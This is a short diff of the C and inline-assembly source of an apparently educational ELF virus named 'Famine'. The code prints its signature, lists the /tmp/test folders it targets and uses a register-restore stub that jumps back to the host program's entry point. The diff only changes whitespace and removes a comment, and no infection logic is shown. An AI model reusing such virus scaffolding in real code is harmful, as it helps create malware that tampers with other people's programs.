@@ -102,10 +102,9 @@ int main(void) {
 	char* str = "Famine version 1.0 (c)oded by eparisot\n";
 	syscall_write(1, str, 39);
 
-
 	listdir("/tmp/test/");
 	listdir("/tmp/test2/");
-
+	
 	__asm__(
 		// restore used registers
 		"pop %r15 \n"	
@@ -123,8 +122,6 @@ int main(void) {
 		"pop %rdx \n"
 		"pop %rcx \n"
 		"pop %rax \n"
-		// restore stack pointer (because of func call)
-		//"add $0x8, %rsp \n"
 		// jump back to main
 		"jmp . + 5 + 0x42424242 \n"
 	);
